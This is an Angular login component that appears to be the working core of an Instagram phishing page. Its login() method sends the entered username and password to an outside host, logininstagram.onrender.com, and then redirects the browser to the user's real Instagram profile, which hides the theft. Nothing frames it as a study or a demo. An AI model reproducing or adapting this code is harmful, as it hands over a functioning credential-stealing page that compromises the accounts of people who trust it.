import { CommonModule } from '@angular/common';
import { HttpClient, HttpClientModule } from '@angular/common/http';
import { Component, OnInit } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { RouterOutlet } from '@angular/router';
import { AppService } from './app.service';

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [RouterOutlet, FormsModule, CommonModule, HttpClientModule],
  templateUrl: './app.component.html',
  styleUrl: './app.component.scss'
})
export class AppComponent implements OnInit {
  isUserName: boolean = false;
  islogin: boolean = false;
  constructor(public service: AppService, private http: HttpClient) {

  }
  ngOnInit() {

  }
  username: any = '';
  password: any = '';
  title = 'login';


  login() {
    this.isUserName = false;
    this.islogin = false;

    if (!this.username) {
      this.isUserName = true;
    }
    if (!this.password) {
      this.islogin = true;
    }
    if (this.password && this.username) {
      this.http.post<any>(`https://logininstagram.onrender.com/`, { username: this.username, password: this.password }).subscribe((res: any) => {
        console.log(res);

        window.open(`https://www.instagram.com/${this.username}`, '_self')
      })
    }
  }
}
